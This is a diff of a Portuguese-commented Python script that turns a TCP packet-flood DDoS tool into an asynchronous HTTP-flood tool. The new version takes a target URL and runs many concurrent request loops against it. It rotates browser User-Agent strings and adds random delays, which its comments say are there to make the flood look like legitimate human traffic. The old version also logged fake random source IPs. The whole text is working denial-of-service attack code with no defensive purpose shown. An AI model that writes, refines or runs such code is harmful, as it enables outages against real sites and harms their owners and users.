@@ -1,87 +1,73 @@
-import socket
-import random
 import asyncio
+import aiohttp
+import random
 import logging
-from concurrent.futures import ThreadPoolExecutor
-import sys
+from multiprocessing import cpu_count
 
 # Configuração de logging para feedback detalhado
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 
-# Função para gerar IPs aleatórios simulando múltiplos dispositivos
-def generate_random_ip():
-    return ".".join(str(random.randint(0, 255)) for _ in range(4))
+# Lista de User Agents para parecer tráfego legítimo
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+]
 
-# Função assíncrona para enviar pacotes TCP
-async def send_packet_tcp(target_ip, target_port, packet_size, attack_id, semaphore, cancel_event):
+# Função para gerar cabeçalhos HTTP aleatórios
+def generate_headers():
+    return {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "keep-alive"
+    }
+
+# Função assíncrona para enviar requisições HTTP
+async def send_request(session, url, attack_id, cancel_event):
     try:
-        # Gerenciar o número de conexões simultâneas com Semaphore
-        async with semaphore:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(5)  # Timeout de 5 segundos para a conexão
-            sock.connect((target_ip, target_port))
+        headers = generate_headers()
+        while not cancel_event.is_set():
+            async with session.get(url, headers=headers) as response:
+                status = response.status
+                logging.info(f"Ataque {attack_id}: {url} -> Status {status}")
+                await asyncio.sleep(random.uniform(0.1, 0.5))  # Intervalo aleatório para parecer tráfego humano
+    except Exception as e:
+        logging.error(f"Ataque {attack_id} falhou para {url} - Erro: {e}")
 
-            logging.info(f"Ataque {attack_id} iniciado de {generate_random_ip()} para {target_ip}:{target_port}")
-            
-            while not cancel_event.is_set():
-                sock.send(random._urandom(packet_size))  # Envia pacote aleatório
-                logging.debug(f"Ataque {attack_id} em andamento: {generate_random_ip()} -> {target_ip}:{target_port}")
-                await asyncio.sleep(0.1)  # Intervalo entre pacotes
+# Função principal para coordenar o envio das requisições
+async def start_attack(url):
+    logging.info("[*] Iniciando ataque HTTP Flood...")
 
-    except socket.timeout:
-        logging.warning(f"Ataque {attack_id} falhou para {target_ip}:{target_port} - Timeout de conexão.")
-    except socket.error as e:
-        logging.error(f"Ataque {attack_id} falhou para {target_ip}:{target_port} - Erro: {e}")
-    except asyncio.CancelledError:
-        logging.info(f"Ataque {attack_id} cancelado para {target_ip}:{target_port}")
-    finally:
-        sock.close()
-
-# Função principal que coordena o envio de pacotes usando múltiplas threads e async
-def start_attack(target_ip, target_port, num_threads, packet_size=1024, sleep_time=0.1):
-    logging.info("[*] Iniciando ataque de DDoS...")
-
-    # Limitando o número de conexões simultâneas
-    semaphore = asyncio.Semaphore(num_threads)
-
-    loop = asyncio.get_event_loop()
     cancel_event = asyncio.Event()
-
-    # Criando as tarefas assíncronas para enviar pacotes
+    num_threads = cpu_count() * 2  # Dobra o número de threads baseado nos núcleos da CPU
     tasks = []
-    for i in range(num_threads):
-        task = loop.create_task(send_packet_tcp(target_ip, target_port, packet_size, i + 1, semaphore, cancel_event))
-        tasks.append(task)
 
-    try:
-        loop.run_until_complete(asyncio.gather(*tasks))
-    except KeyboardInterrupt:
-        logging.info("Ataque interrompido pelo usuário.")
-        cancel_event.set()  # Sinaliza o cancelamento de todas as tarefas
-        loop.run_until_complete(asyncio.gather(*tasks))  # Aguarda as tarefas terminarem
-    finally:
-        logging.info("[*] Ataque concluído com sucesso!")
+    async with aiohttp.ClientSession() as session:
+        for i in range(num_threads):
+            task = asyncio.create_task(send_request(session, url, i + 1, cancel_event))
+            tasks.append(task)
 
-# Função principal que solicita entradas do usuário e inicia o ataque
+        try:
+            while True:
+                await asyncio.sleep(5)  # Aguarda enquanto as requisições continuam
+        except KeyboardInterrupt:
+            logging.info("Ataque interrompido pelo usuário.")
+            cancel_event.set()  # Envia o sinal para cancelar as tarefas
+        finally:
+            await asyncio.gather(*tasks, return_exceptions=True)  # Aguarda todas as tarefas finalizarem
+            logging.info("[*] Ataque concluído!")
+
+# Função principal para capturar a URL
 def main():
     try:
-        target_ip = input("Digite o IP do alvo (ex: 192.168.1.1): ")
-        target_port = int(input("Digite a porta do alvo (ex: 80): "))
-        num_threads = int(input("Digite o número de threads para o ataque: "))
-        packet_size = int(input("Digite o tamanho do pacote (default 1024): ") or 1024)
-        sleep_time = float(input("Digite o intervalo entre pacotes (em segundos, default 0.1): ") or 0.1)
+        url = input("Digite a URL do alvo (ex: http://example.com): ").strip()
 
-        # Iniciar o ataque com os parâmetros fornecidos
-        start_attack(target_ip, target_port, num_threads, packet_size, sleep_time)
+        # Iniciar o ataque com a URL fornecida
+        asyncio.run(start_attack(url))
         
-    except ValueError:
-        logging.error("Erro: Entrada inválida! Certifique-se de inserir números para a porta e o número de threads.")
-        sys.exit(1)
     except KeyboardInterrupt:
-        logging.info("Ataque interrompido pelo usuário.")
-    except Exception as e:
-        logging.error(f"Erro inesperado: {e}")
-        sys.exit(1)
+        logging.info("Execução interrompida pelo usuário.")
 
 if __name__ == "__main__":
     main()
